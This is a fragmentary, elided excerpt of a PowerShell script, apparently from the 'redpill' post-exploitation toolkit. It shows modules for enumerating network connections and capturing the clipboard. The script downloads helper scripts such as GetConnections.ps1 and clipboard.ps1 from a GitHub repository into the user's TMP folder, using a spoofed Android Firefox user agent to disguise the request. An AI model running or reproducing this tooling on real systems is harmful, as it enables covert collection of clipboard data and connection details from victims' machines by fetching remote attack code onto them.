...
If($GetConnections -ieq "Enum" -or $GetConnections -ieq "Verbose"){
   ...
   If(-not(Test-Path -Path "$Env:TMP\GetConnections.ps1")){## Download GetConnections.ps1 from my GitHub repository
      ...
      If($SizeDump -lt 10){## Corrupted download detected => DefaultFileSize: 10,232421875/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
...
If($Clipboard -ne "false"){
   ...
   {
      iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/clipboard.ps1" -OutFile "$Env:TMP\clipboard.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
